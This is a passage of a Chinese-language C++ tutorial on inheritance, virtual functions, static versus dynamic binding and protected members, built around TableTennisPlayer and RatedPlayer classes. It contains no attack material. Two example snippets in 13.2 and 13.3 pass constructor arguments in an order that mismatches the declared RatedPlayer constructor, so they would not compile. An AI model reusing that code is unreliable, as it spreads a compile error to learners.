const; // 显示姓名 bool HasTable() const &#123; return hasTable; &#125;; // 是否有球桌 void ResetTable(bool v) &#123; hasTable = v; &#125;; // 重置球桌状态&#125;;#endif // TABTENN0_H_ tabtenn0.cpp (基类实现) 12345678910#include &quot;tabtenn0.h&quot;#include &lt;iostream&gt;TableTennisPlayer::TableTennisPlayer (const std::string &amp; fn, const std::string &amp; ln, bool ht) : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125; // 使用成员初始化列表void TableTennisPlayer::Name() const &#123; std::cout &lt;&lt; lastname &lt;&lt; &quot;, &quot; &lt;&lt; firstname;&#125; 这个基类很简单，包含了球员的基本信息和操作。 13.1.1 派生一个类现在，假设我们想为一部分球员添加“积分”信息。我们可以从 TableTennisPlayer 派生出一个新的类 RatedPlayer，它将继承 TableTennisPlayer 的所有成员，并添加自己的积分成员和相关方法。 继承语法: 123class DerivedClassName : accessSpecifier BaseClassName &#123; // ... 派生类新增的成员 ...&#125;; DerivedClassName: 派生类的名称。 :: 表示继承关系。 accessSpecifier: 访问说明符（通常是 public），指定继承类型。 BaseClassName: 基类的名称。 RatedPlayer 类的定义 (添加到 tabtenn0.h 或新的头文件) 我们将 RatedPlayer 的定义也放在 tabtenn0.h 中（虽然分成不同文件更好）。 12345678910111213141516171819// ... (TableTennisPlayer 定义之后) ...// 简单的派生类class RatedPlayer : public TableTennisPlayer &#123; // 使用 public 继承private: unsigned int rating; // 新增成员：积分public: // 派生类构造函数 RatedPlayer (unsigned int r = 0, const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // 使用基类对象进行构造 RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp); // 新增方法 unsigned int Rating() const &#123; return rating; &#125; // 获取积分 void ResetRating (unsigned int r) &#123; rating = r; &#125; // 重置积分&#125;;// ... (endif) ... class RatedPlayer : public TableTennisPlayer: 这声明了 RatedPlayer 是一个从 TableTennisPlayer 公有继承 (publicly derived) 而来的类。 公有继承 (public): 这是最常用的继承方式。它建立了一种 “is-a” 关系。基类的公有成员在派生类中仍然是公有的，基类的保护成员在派生类中仍然是保护的。基类的私有成员虽然被继承下来了，但在派生类中是不可直接访问的。 RatedPlayer 自动拥有了 firstname, lastname, hasTable 数据成员以及 Name(), HasTable(), ResetTable() 方法（尽管私有成员不能直接访问）。 RatedPlayer 添加了自己的私有成员 rating 和公有方法 Rating(), ResetRating()。 13.1.2 构造函数：访问权限的考虑派生类不能直接访问基类的私有成员。那么，派生类的构造函数如何初始化继承来的基类私有成员（如 firstname, lastname）呢？ 答案是：派生类构造函数必须调用基类的构造函数来完成基类部分的初始化。这是通过成员初始化列表 (Member Initializer List) 实现的。 派生类构造函数的实现 (添加到 tabtenn0.cpp) 1234567891011121314// ... (TableTennisPlayer 实现之后) ...// RatedPlayer 构造函数实现RatedPlayer::RatedPlayer(unsigned int r, const std::string &amp; fn, const std::string &amp; ln, bool ht) : TableTennisPlayer(fn, ln, ht), rating(r) &#123; // 调用基类构造函数 // rating(r) 初始化派生类自己的成员 // 基类部分的初始化委托给 TableTennisPlayer 的构造函数&#125;RatedPlayer::RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp) : TableTennisPlayer(tp), rating(r) &#123; // 调用基类的复制构造函数 (这里是隐式生成的) // rating(r) 初始化派生类自己的成员&#125; : TableTennisPlayer(fn, ln, ht): 这部分是成员初始化列表的关键。它显式地调用了基类 TableTennisPlayer 的构造函数，并将必要的参数 (fn, ln, ht) 传递给它。基类构造函数负责初始化 firstname, lastname, hasTable。 , rating(r): 初始化列表也用于初始化派生类自己的成员 rating。 规则: 在创建派生类对象时，程序会首先调用基类的构造函数来创建和初始化对象的基类部分，然后再执行派生类构造函数体（并初始化派生类成员）。如果你不在成员初始化列表中显式调用基类构造函数，编译器会尝试调用基类的默认构造函数。如果基类没有默认构造函数，或者你需要调用带参数的基类构造函数，就必须在初始化列表中显式调用。 13.1.3 使用派生类派生类的对象拥有基类和派生类的所有公有成员。 usett0.cpp (使用示例) 123456789101112131415161718192021222324252627282930// filepath: d:\\ProgramData\\files_Cpp\\250424\\usett0.cpp#include &lt;iostream&gt;#include &quot;tabtenn0.h&quot; // 包含基类和派生类定义int main ( void ) &#123; using std::cout; using std::endl; TableTennisPlayer player1(&quot;Chuck&quot;, &quot;Blizzard&quot;, true); RatedPlayer rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true); // 使用派生类构造函数 // 派生类对象可以使用基类的方法 rplayer1.Name(); // 调用继承来的 TableTennisPlayer::Name() if (rplayer1.HasTable()) // 调用继承来的 TableTennisPlayer::HasTable() cout &lt;&lt; &quot;: has a table.\\n&quot;; else cout &lt;&lt; &quot;: hasn&#x27;t a table.\\n&quot;; // 派生类对象可以使用自己的方法 cout &lt;&lt; &quot;Name: &quot;; rplayer1.Name(); cout &lt;&lt; &quot;; Rating: &quot; &lt;&lt; rplayer1.Rating() &lt;&lt; endl; // 调用 RatedPlayer::Rating() // 可以使用基类对象初始化派生类对象 (通过特定构造函数) RatedPlayer rplayer2(1212, player1); cout &lt;&lt; &quot;Name: &quot;; rplayer2.Name(); cout &lt;&lt; &quot;; Rating: &quot; &lt;&lt; rplayer2.Rating() &lt;&lt; endl; return 0;&#125; 编译和运行: 你需要将 tabtenn0.cpp 和 usett0.cpp 一起编译链接。 12g++ usett0.cpp tabtenn0.cpp -o usett0./usett0 输出: 123Duck, Mallory: has a table.Name: Duck, Mallory; Rating: 1140Name: Blizzard, Chuck; Rating: 1212 13.1.4 派生类和基类之间的特殊关系公有继承建立了一种非常重要的关系： 派生类对象也是一个基类对象: 一个 RatedPlayer 对象是一个 TableTennisPlayer 对象。这意味着需要 TableTennisPlayer 对象的地方，通常可以使用 RatedPlayer 对象来替代。 基类指针/引用可以指向/引用派生类对象: 12345678910RatedPlayer rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true);TableTennisPlayer * pt = &amp;rplayer1; // 基类指针指向派生类对象 (OK)TableTennisPlayer &amp; rt = rplayer1; // 基类引用引用派生类对象 (OK)pt-&gt;Name(); // 通过基类指针调用基类方法 (OK)rt.Name(); // 通过基类引用调用基类方法 (OK)// 但是，通过基类指针/引用不能直接调用派生类特有的方法// pt-&gt;Rating(); // 错误！TableTennisPlayer 没有 Rating() 方法// rt.Rating(); // 错误！ 这种指针/引用的兼容性是实现多态 (Polymorphism) 的基础，我们将在后续章节详细讨论。 总结: 继承允许基于现有类（基类）创建新类（派生类）。 派生类继承基类的成员（数据和方法）。 公有继承 (public) 建立 “is-a” 关系，基类的公有成员在派生类中仍是公有。 派生类构造函数必须通过成员初始化列表调用适当的基类构造函数来初始化继承的基类成员。 派生类对象可以使用基类的公有方法。 基类指针或引用可以指向或引用派生类对象，但只能通过它们调用基类中定义的方法（除非使用虚函数和动态联编）。 13.2 继承：is-a 关系我们在上一节看到了如何从一个基类派生出新类。其中，公有继承 (public) 是最常用的一种继承方式，它建立了一种被称为 “is-a” （或 “is-a-kind-of”）的关系模型。 什么是 “is-a” 关系？ “is-a” 关系意味着派生类的对象本质上也是基类的一种。换句话说，派生类是基类的一个特殊化版本。 在我们的例子中，RatedPlayer 是一个 TableTennisPlayer。一个有积分的球员首先是一个乒乓球球员，只是他还额外具有积分属性。 类似地，如果有一个 Employee 类和一个 Manager 类，并且 Manager 公有继承自 Employee，那么一个 Manager 是一个 Employee。经理是员工的一种特殊类型，具有额外的职责或属性。 一个 Circle 是一个 Shape。 一个 Dog 是一个 Animal。 公有继承如何体现 “is-a”？ 公有继承之所以能模拟 “is-a” 关系，关键在于它保证了派生类对象拥有基类的所有公有接口。 当 RatedPlayer 公有继承 TableTennisPlayer 时，TableTennisPlayer 的所有 public 成员（如 Name(), HasTable(), ResetTable()）在 RatedPlayer 中也保持 public。 这意味着任何可以对 TableTennisPlayer 对象执行的操作（通过其公有接口），同样也可以对 RatedPlayer 对象执行。一个 RatedPlayer 对象可以像 TableTennisPlayer 对象一样被使用，因为它具备了 TableTennisPlayer 的所有基本功能。 代码体现: 这种关系最直接的体现就是基类指针或引用可以指向或引用派生类对象： 1234567891011121314151617181920212223RatedPlayer rp(&quot;May&quot;, &quot;Lee&quot;, true, 1500);TableTennisPlayer ttp(&quot;John&quot;, &quot;Doe&quot;, false);// &quot;is-a&quot; 关系允许这种赋值/初始化TableTennisPlayer &amp; rt = rp; // 基类引用可以引用派生类对象TableTennisPlayer * pt = &amp;rp; // 基类指针可以指向派生类对象// 可以通过基类引用/指针调用基类的方法rt.Name(); // 输出 Lee, Maypt-&gt;Name(); // 输出 Lee, May// 但不能直接通过基类引用/指针调用派生类特有的方法// rt.Rating(); // 错误! TableTennisPlayer 没有 Rating() 方法// pt-&gt;Rating(); // 错误!// 也可以将派生类对象传递给需要基类对象的函数void showPlayerName(const TableTennisPlayer &amp; player) &#123; player.Name(); std::cout &lt;&lt; std::endl;&#125;showPlayerName(ttp); // 传递基类对象 (OK)showPlayerName(rp); // 传递派生类对象 (OK, 因为 RatedPlayer is-a TableTennisPlayer) 与其他关系的对比: 继承（特别是公有继承）与其他类之间的关系不同： “has-a” 关系 (包含/组合 - Composition): 一个类包含另一个类的对象作为其成员。例如，一个 Car 有一个 Engine。这通常通过将 Engine 对象作为 Car 类的数据成员来实现。Car 不是 Engine，Engine 也不是 Car。 123456class Engine &#123; /* ... */ &#125;;class Car &#123;private: Engine engine_member; // Car has-a Engine // ...&#125;; “uses-a” 关系 (使用 - Association/Dependency): 一个类在它的方法中使用了另一个类的对象（例如，作为参数、返回值或局部变量），但并不拥有它。例如，一个 Programmer 使用一个 Computer。 1234567class Computer &#123; /* ... */ &#125;;class Programmer &#123;public: void writeCode(Computer&amp; pc) &#123; // Programmer uses-a Computer // ... 使用 pc 对象 ... &#125;&#125;; 为什么区分很重要？ 正确地识别类之间的关系并选择合适的实现方式（公有继承、私有继承、保护继承、组合、关联）对于设计良好、可维护的面向对象系统至关重要。 公有继承 (public) 应该只用于模拟真正的 “is-a” 关系。如果派生类不能完全替代基类（即不符合 Liskov 替换原则 - Liskov Substitution Principle），那么使用公有继承可能是不恰当的。 如果关系是 “has-a”，应该使用组合（成员对象）。 如果只是临时使用，则是 “uses-a” 关系。 不恰当的 “is-a” 示例: 假设你想创建一个 Square 类和一个 Rectangle 类。你可能会想让 Square 继承自 Rectangle，因为正方形“是”矩形。但这里存在问题：如果 Rectangle 有 setWidth() 和 setHeight() 方法，并且它们可以独立设置宽高，那么当你在一个被视为 Rectangle 的 Square 对象上调用 setWidth() 时，为了保持正方形的性质，你可能需要同时修改高度，这违反了 Rectangle 的行为预期（宽度和高度可以独立设置）。在这种情况下，公有继承可能不是最佳选择，可能需要重新考虑设计或使用其他继承方式。 总结: 公有继承 (public) 建立了一种 “is-a” 关系，表示派生类是基类的一种特殊类型。 “is-a” 关系的核心是派生类继承了基类的公有接口，因此可以像基类对象一样被使用。 这体现在基类指针或引用可以指向或引用派生类对象。 应将公有继承与 “has-a”（组合）和 “uses-a”（关联）关系区分开。 只有在派生类确实符合基类的行为契约时，才应使用公有继承。 13.3 多态公有继承我们已经知道，公有继承建立了 “is-a” 关系，允许我们使用基类指针或引用来指向或引用派生类对象。例如： 12RatedPlayer rp(&quot;May&quot;, &quot;Lee&quot;, true, 1500);TableTennisPlayer * pt = &amp;rp; // 基类指针指向派生类对象 然而，当我们通过基类指针或引用调用一个同时存在于基类和派生类中的方法时，默认情况下会发生什么呢？ 1pt-&gt;Name(); // 调用哪个 Name() 方法？ TableTennisPlayer::Name() 还是 RatedPlayer::Name()？ 在没有特殊处理的情况下，C++ 默认使用静态联编 (Static Binding) 或早绑定 (Early Binding)**。这意味着编译器在编译时根据指针或引用的静态类型**（声明的类型，这里是 TableTennisPlayer*）来决定调用哪个版本的方法。因此，即使 pt 实际指向一个 RatedPlayer 对象，pt-&gt;Name() 也会调用 TableTennisPlayer::Name()。 这通常不是我们期望的行为，尤其是在处理不同类型的派生类对象时。我们希望程序能够在运行时根据指针或引用实际指向的对象类型来选择调用相应的方法。这种“多种形态”的行为就是**多态 (Polymorphism)**。 多态是面向对象编程的三大支柱之一（另外两个是封装和继承）。它允许我们以统一的方式（通过基类接口）处理不同类型的对象，而这些对象各自以自己的方式响应相同的消息（方法调用）。 如何实现多态？ C++ 通过使用虚函数 (Virtual Functions) 和动态联编 (Dynamic Binding) 或晚绑定 (Late Binding) 来实现多态。 虚函数 (Virtual Functions): 要在派生类中重新定义（覆盖）基类的方法，并且希望通过基类指针/引用调用时能够执行派生类的版本，就必须在基类中将该方法声明为虚函数。 通过在基类方法声明前加上 virtual 关键字来实现。 修改 TableTennisPlayer (tabtenn1.h) 让我们创建一个新版本的头文件 tabtenn1.h，在其中将 Name() 方法声明为虚函数。 12345678910111213141516171819202122232425262728293031323334353637383940#ifndef TABTENN1_H_#define TABTENN1_H_#include &lt;string&gt;#include &lt;iostream&gt; // 添加 iostream 以便在头文件中使用 cout (虽然通常不推荐)// 基类 - 使用虚函数class TableTennisPlayer &#123;private: std::string firstname; std::string lastname; bool hasTable;public: TableTennisPlayer (const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // 将 Name() 声明为虚函数 virtual void Name() const; bool HasTable() const &#123; return hasTable; &#125;; void ResetTable(bool v) &#123; hasTable = v; &#125;; // 添加一个虚析构函数通常是好习惯 (稍后解释) virtual ~TableTennisPlayer() &#123; &#125;&#125;;// 派生类class RatedPlayer : public TableTennisPlayer &#123;private: unsigned int rating;public: RatedPlayer (unsigned int r = 0, const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp); unsigned int Rating() const &#123; return rating; &#125; void ResetRating (unsigned int r) &#123; rating = r; &#125; // 覆盖基类的虚函数 Name() // C++11 推荐使用 override 关键字明确表示覆盖 virtual void Name() const override; // 也可以只写 virtual void Name() const; // 或 void Name() const; (如果基类是 virtual，派生类同名同参方法自动也是 virtual)&#125;;#endif // TABTENN1_H_ 修改实现 (tabtenn1.cpp) 我们需要提供 RatedPlayer::Name() 的实现，并更新构造函数以匹配新的类名。 1234567891011121314151617181920212223242526272829#include &quot;tabtenn1.h&quot;#include &lt;iostream&gt;// TableTennisPlayer 方法TableTennisPlayer::TableTennisPlayer (const std::string &amp; fn, const std::string &amp; ln, bool ht) : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;void TableTennisPlayer::Name() const &#123; std::cout &lt;&lt; lastname &lt;&lt; &quot;, &quot; &lt;&lt; firstname;&#125;// RatedPlayer 方法RatedPlayer::RatedPlayer(unsigned int r, const std::string &amp; fn, const std::string &amp; ln, bool ht) : TableTennisPlayer(fn, ln, ht), rating(r) &#123;&#125;RatedPlayer::RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp) : TableTennisPlayer(tp), rating(r) &#123;&#125;// RatedPlayer 覆盖的 Name() 方法实现void RatedPlayer::Name() const &#123; // 可以调用基类的 Name() 方法 TableTennisPlayer::Name(); // 添加自己的输出 std::cout &lt;&lt; &quot;, Rating: &quot; &lt;&lt; rating;&#125; 动态联编 (Dynamic Binding): 当通过基类指针或引用调用一个虚函数时，程序会根据指针或引用实际指向的对象类型来决定调用哪个版本的方法。这个决定是在运行时做出的，因此称为动态联编或晚绑定。 使用示例 (usett1.cpp) 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &quot;tabtenn1.h&quot; // 使用包含虚函数的新版本int main ( void ) &#123; using std::cout; using std::endl; TableTennisPlayer player1(&quot;Tara&quot;, &quot;Boomdea&quot;, false); RatedPlayer rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true); // 通过对象直接调用，总是调用对象所属类的方法 (静态联编) cout &lt;&lt; &quot;Direct call:\\n&quot;; player1.Name(); cout &lt;&lt; endl; // 调用 TableTennisPlayer::Name() rplayer1.Name(); cout &lt;&lt; endl; // 调用 RatedPlayer::Name() // 通过指针调用虚函数 (动态联编) cout &lt;&lt; &quot;\\nUsing pointers to base type:\\n&quot;; TableTennisPlayer * pt1 = &amp;player1; TableTennisPlayer * pt2 = &amp;rplayer1; pt1-&gt;Name(); cout &lt;&lt; endl; // pt1 指向 TableTennisPlayer 对象，调用 TableTennisPlayer::Name() pt2-&gt;Name(); cout &lt;&lt; endl; // *** pt2 指向 RatedPlayer 对象，调用 RatedPlayer::Name() *** // 通过引用调用虚函数 (动态联编) cout &lt;&lt; &quot;\\nUsing references to base type:\\n&quot;; TableTennisPlayer &amp; rt1 = player1; TableTennisPlayer &amp; rt2 = rplayer1; rt1.Name(); cout &lt;&lt; endl; // rt1 引用 TableTennisPlayer 对象，调用 TableTennisPlayer::Name() rt2.Name(); cout &lt;&lt; endl; // *** rt2 引用 RatedPlayer 对象，调用 RatedPlayer::Name() *** return 0;&#125; 编译和运行: 12g++ usett1.cpp tabtenn1.cpp -o usett1./usett1 输出: 1234567891011Direct call:Boomdea, TaraDuck, Mallory, Rating: 1140Using pointers to base type:Boomdea, TaraDuck, Mallory, Rating: 1140Using references to base type:Boomdea, TaraDuck, Mallory, Rating: 1140 可以看到，当通过基类指针 pt2 或基类引用 rt2 调用虚函数 Name() 时，程序在运行时检查到它们实际指向/引用的是 RatedPlayer 对象，因此调用了 RatedPlayer::Name() 版本，实现了多态行为。 为什么需要多态？ 多态允许我们编写更通用、更灵活的代码。例如，我们可以创建一个函数，接受一个 TableTennisPlayer 的指针或引用数组，然后遍历这个数组，对每个元素调用 Name() 方法。即使数组中包含不同类型的球员（TableTennisPlayer, RatedPlayer 或其他派生类），只要 Name() 是虚函数，每个对象都会以自己正确的方式显示其名称和信息。 12345678void ShowPlayerInfo(const TableTennisPlayer &amp; player) &#123; player.Name(); // 会根据 player 实际类型调用正确的 Name() 版本 cout &lt;&lt; endl;&#125;// ... in main ...ShowPlayerInfo(player1);ShowPlayerInfo(rplayer1); 总结: 多态允许以统一的方式处理不同类型的对象。 C++ 通过公有继承、虚函数 (virtual) 和动态联编来实现多态。 在基类中将希望在派生类中重新定义并希望通过基类指针/引用调用的方法声明为 virtual。 当通过基类指针或引用调用虚函数时，程序在运行时根据对象的实际类型确定要调用的方法版本（动态联编）。 如果未使用 virtual，则根据指针/引用的声明类型在编译时确定调用版本（静态联编）。 多态是实现代码灵活性和可扩展性的关键 OOP 技术。 13.4 静态联编和动态联编联编 (Binding) 指的是将源代码中的函数调用（或方法调用）与其在可执行代码中的具体实现（函数体）关联起来的过程。C++ 支持两种类型的联编：静态联编和动态联编。理解它们的区别对于掌握多态至关重要。 13.4.1 指针和引用类型的兼容性我们已经知道，在公有继承下，基类指针或引用可以指向或引用派生类对象。这是实现多态的前提。 1234// 假设 RatedPlayer 公有继承自 TableTennisPlayerRatedPlayer rp;TableTennisPlayer * pt = &amp;rp; // OKTableTennisPlayer &amp; rt = rp; // OK 这种向上转换（将派生类指针/引用转换为基类指针/引用）是自动且安全的，因为派生类对象保证包含了基类的所有成员和接口。 反过来，将基类指针或引用转换为派生类指针或引用（向下转换）通常是不安全的，需要显式类型转换（如 dynamic_cast，将在后面章节讨论），并且只有在指针/引用确实指向一个派生类对象时才有效。 13.4.2 虚成员函数和动态联编现在考虑通过基类指针或引用调用成员函数： 12pt-&gt;SomeMethod();rt.SomeMethod(); 编译器如何决定调用哪个 SomeMethod 的实现（基类的还是派生类的）？这取决于 SomeMethod 是否是虚函数以及联编方式。 静态联编 (Static Binding / Early Binding): 何时发生: 当调用的函数不是虚函数时，或者当通过对象本身（而不是指针或引用）调用函数时（无论是虚函数还是非虚函数）。 决策依据: 编译器在编译时根据指针或引用的声明类型（静态类型）来决定调用哪个函数版本。 行为: 即使基类指针 pt 指向一个派生类对象 rp，如果 SomeMethod 不是虚函数，pt-&gt;SomeMethod() 仍然会调用基类的 SomeMethod 版本。 效率: 静态联编效率较高，因为在编译时就已经确定了要调用的函数地址。 动态联编 (Dynamic Binding / Late Binding): 何时发生: 当通过基类指针或引用调用一个虚函数 (virtual) 时。 决策依据: 程序在运行时检查指针或引用实际指向的对象类型，并调用该对象所属类的相应虚函数版本。 行为: 如果基类指针 pt 指向一个派生类对象 rp，并且 SomeMethod 是虚函数，pt-&gt;SomeMethod() 会调用派生类的 SomeMethod 版本。这就是多态的核心。 实现机制 (概念上): 编译器通常为包含虚函数的类创建一个**虚函数表 (virtual function table, vtable)**。vtable 是一个存储虚函数地址的数组。每个包含虚函数的类的对象内部都有一个隐藏的指针（通常称为 vptr），指向其类的 vtable。当通过基类指针调用虚函数时，程序通过对象的 vptr 找到 vtable，然后在 vtable 中查找并调用正确的函数地址。这个查找过程发生在运行时。 效率: 动态联编比静态联编有轻微的运行时开销（需要查找 vtable），但在现代处理器上这种开销通常很小，而它带来的灵活性是巨大的。 总结对比: 特性 静态联编 (Static Binding) 动态联编 (Dynamic Binding) 发生时间 编译时 运行时 触发条件 调用非虚函数，或通过对象调用任何函数 通过基类指针/引用调用虚函数 决策依据 指针/引用的声明类型 (静态类型) 指针/引用实际指向的对象类型 (动态类型) 行为 调用声明类型的函数版本 调用实际对象类型的函数版本 (多态) 机制 直接函数调用 通常通过虚函数表 (vtable) 实现 效率 较高 略低于静态联编，但通常可接受 13.4.3 有关虚函数注意事项为了正确使用虚函数和动态联编，需要注意以下几点： 在基类中声明 virtual: 必须在基类中将希望表现出多态行为的函数声明为 virtual。 派生类覆盖: 如果派生类提供了同名、同参数列表（包括 const 属性）的方法，它将自动覆盖（override）基类的虚函数。这个派生类方法也自动成为虚函数，无论是否显式使用了 virtual 关键字。 override 关键字 (C++11): 强烈建议在派生类覆盖虚函数时使用 override 关键字。这会让编译器检查该方法是否确实覆盖了基类中的某个虚函数。如果签名不匹配（例如，参数类型不同或 const 属性不同），编译器会报错，帮助捕获潜在错误。 12345678910class Base &#123;public: virtual void func(int) const;&#125;;class Derived : public Base &#123;public: // virtual void func(int) override; // 错误！const 属性不匹配 virtual void func(int) const override; // 正确！明确覆盖&#125;; final 关键字 (C++11): 如果不希望某个虚函数在更深层次的派生类中被进一步覆盖，可以在其声明后加上 final。也可以将整个类声明为 final，阻止任何类从它派生。 123456789101112131415161718class Base &#123;public: virtual void func() const;&#125;;class Derived : public Base &#123;public: // 覆盖 func，并且不允许 Derived 的子类再覆盖它 virtual void func() const override final;&#125;;class MoreDerived : public Derived &#123;public: // virtual void func() const override; // 错误！因为 Derived::func 被标记为 final&#125;;class CannotInherit final : public Base &#123; // 这个类不能被继承 // ...&#125;;// class Problem : public CannotInherit &#123;&#125;; // 错误！ 构造函数不能是虚函数: 对象的类型在构造完成之前是未确定的，因此构造函数无法实现动态联编。 析构函数应该是虚函数: 如果一个类打算作为基类（特别是如果可能通过基类指针 delete 派生类对象），那么它的析构函数应该声明为虚函数 (virtual ~Base();)。 原因: 考虑 Base *p = new Derived; delete p;。如果 ~Base() 不是虚函数，delete p; 只会调用 ~Base()，派生类 Derived 的析构函数 ~Derived() 将不会被调用，可能导致派生类分配的资源（如动态内存）泄漏。如果 ~Base() 是虚函数，delete p; 会通过动态联编正确地调用 ~Derived()，然后再调用 ~Base()，确保所有资源都被释放。 规则: 如果类中有任何虚函数，通常就应该提供一个虚析构函数。即使基类析构函数什么也不做，也应将其声明为 virtual。 友元函数不能是虚函数: 友元函数不是类的成员函数，继承机制不适用于它们。 静态成员函数不能是虚函数: 静态成员函数与类本身关联，而不是与特定对象关联（没有 this 指针），因此动态联编对其没有意义。 理解静态联编和动态联编的区别，以及何时、如何使用虚函数，是掌握 C++ 多态特性和编写健壮、可扩展的面向对象代码的关键。 13.5 访问控制：protected到目前为止，我们使用了 public 和 private 访问说明符来控制对类成员的访问。 public 成员可以被任何地方的代码访问。 private 成员只能被定义它们的类的成员函数（以及友元）访问。 在继承的背景下，private 成员有一个重要的限制：基类的 private 成员不能被派生类的成员函数直接访问。派生类需要通过基类的 public 或 protected 接口（方法）来间接与基类的私有数据交互。 C++ 提供了第三个访问说明符：**protected**。 protected 成员的访问规则: 对于类的外部（非成员函数，非派生类），protected 成员的行为与 private 成员相同，即不可访问。 对于类的成员函数（以及友元），protected 成员的行为与 public 成员相同，即可直接访问。 对于派生类的成员函数，protected 成员的行为也与 public 成员相同，即派生类可以直接访问基类的 protected 成员。 总结访问权限: 访问来源 public 成员 protected 成员 private 成员 类内部 (成员函数) 可访问 可访问 可访问 派生类 (成员函数) 可访问 可访问 不可访问 类外部 (普通代码) 可访问 不可访问 不可访问 示例：修改 TableTennisPlayer 使用 protected 让我们修改 TableTennisPlayer 类，将 firstname 和 lastname 设为 protected，看看 RatedPlayer 如何访问它们。 tabtenn_prot.h (使用 protected 的版本) 123456789101112131415161718192021222324252627282930313233343536373839#ifndef TABTENN_PROT_H_#define TABTENN_PROT_H_#include &lt;string&gt;#include &lt;iostream&gt;// 基类 - 使用 protected 成员class TableTennisPlayerProt &#123;// protected 成员:protected: // 改为 protected std::string firstname; std::string lastname;private: // hasTable 仍然是 private bool hasTable;public: TableTennisPlayerProt (const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // Name() 不再需要，因为派生类可以直接访问 protected 成员来构建自己的 Name() // virtual void Name() const; // 可以移除或保留 bool HasTable() const &#123; return hasTable; &#125;; void ResetTable(bool v) &#123; hasTable = v; &#125;; virtual ~TableTennisPlayerProt() &#123; &#125;&#125;;// 派生类class RatedPlayerProt : public TableTennisPlayerProt &#123;private: unsigned int rating;public: RatedPlayerProt (unsigned int r = 0, const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); RatedPlayerProt(unsigned int r, const TableTennisPlayerProt &amp; tp); unsigned int Rating() const &#123; return rating; &#125; void ResetRating (unsigned int r) &#123; rating = r; &#125; // 派生类可以直接访问基类的 protected 成员 void ShowInfo() const; // 新增一个方法来演示访问&#125;;#endif // TABTENN_PROT_H_ tabtenn_prot.cpp (实现) 12345678910111213141516171819202122232425262728293031323334#include &quot;tabtenn_prot.h&quot;#include &lt;iostream&gt;// TableTennisPlayerProt 方法TableTennisPlayerProt::TableTennisPlayerProt (const std::string &amp; fn, const std::string &amp; ln, bool ht) : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;// RatedPlayerProt 方法RatedPlayerProt::RatedPlayerProt(unsigned int r, const std::string &amp; fn, const std::string &amp; ln, bool ht) : TableTennisPlayerProt(fn, ln, ht), rating(r) &#123;&#125;// 注意：这个构造函数仍然需要调用基类构造函数，// 因为即使 firstname/lastname 是 protected，初始化也应由基类负责。// 但如果基类没有提供合适的构造函数，派生类可以在其构造函数体中// 直接给 protected 成员赋值 (虽然不推荐)。RatedPlayerProt::RatedPlayerProt(unsigned int r, const TableTennisPlayerProt &amp; tp) : TableTennisPlayerProt(tp), rating(r) &#123;&#125;// 派生类方法可以直接访问基类的 protected 成员void RatedPlayerProt::ShowInfo() const &#123; // 直接访问继承来的 protected 成员 firstname 和 lastname std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; lastname &lt;&lt; &quot;, &quot; &lt;&lt; firstname; std::cout &lt;&lt; &quot;; Rating: &quot; &lt;&lt; rating; // 不能直接访问基类的 private 成员 hasTable // std::cout &lt;&lt; HasTable(); // 需要通过基类的 public 方法访问 if (HasTable()) std::cout &lt;&lt; &quot;; Has Table: Yes\\n&quot;; else std::cout &lt;&lt; &quot;; Has Table: No\\n&quot;;&#125; 使用示例 (usett_prot.cpp) 12345678910111213141516171819202122#include &lt;iostream&gt;#include &quot;tabtenn_prot.h&quot;int main ( void ) &#123; using std::cout; using std::endl; RatedPlayerProt rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true); TableTennisPlayerProt player1(&quot;Tara&quot;, &quot;Boomdea&quot;, false); // 基类对象 cout &lt;&lt; &quot;Rated Player Info:\\n&quot;; rplayer1.ShowInfo(); // 调用派生类方法，该方法访问了基类的 protected 成员 // 外部代码不能直接访问 protected 成员 // cout &lt;&lt; rplayer1.firstname; // 错误！firstname 是 protected // cout &lt;&lt; player1.lastname; // 错误！lastname 是 protected // 外部代码可以访问 public 成员 cout &lt;&lt; &quot;\\nPlayer 1 Has Table? &quot; &lt;&lt; player1.HasTable() &lt;&lt; endl; // OK return 0;&#125; 编译和运行: 12g++ usett_prot.cpp tabtenn_prot.cpp -o usett_prot./usett_prot 输出: 1234Rated Player Info:Name: Duck, Mallory; Rating: 1140; Has Table: YesPlayer 1 Has Table? 0 使用 protected 的利弊: 优点: 为派生类提供比 private 更大的访问权限，允许派生类更直接地与基类实现交互。 相比 public，仍然对外部世界隐藏了实现细节。 缺点: 破坏封装: 将成员设为 protected 而不是 private，意味着基类的实现细节暴露给了所有派生类。如果将来修改基类的 protected 成员，可能会影响所有派生类，增加了类之间的耦合度。 维护困难: 随着继承层次的加深，追踪哪些类依赖于特定的 protected 成员会变得困难。 设计建议: 优先使用 private 成员，并通过 public 或 protected 成员函数提供对数据的访问（如果需要）。这提供了更好的封装和灵活性。 只有当你确定派生类确实需要直接访问基类的某个实现细节，并且提供 public/protected 接口不方便或效率低下时，才考虑使用 protected 数据成员。 protected 成员函数通常比 protected 数据成员更受欢迎，因为它们提供了受控的访问接口，而不是直接暴露数据。 总之，protected 提供了一种介于 private 和 public 之间的访问控制级别，主要用于管理基类和派生类之间的访问权限。 13.6 抽象基类在设计类层次结构时，我们有时会遇到这样一种情况：基类本身代表的是一个非常抽象的概念，以至于创建该基类的对象本身没有意义。它存在的目的主要是为了定义一个共同的接口，供所有具体的派生类来实现。这种只作为接口规范、不能被实例化的基类称为**抽象基类 (Abstract Base Class, ABC)**。 例如，考虑一个图形库，可能有一个 Shape 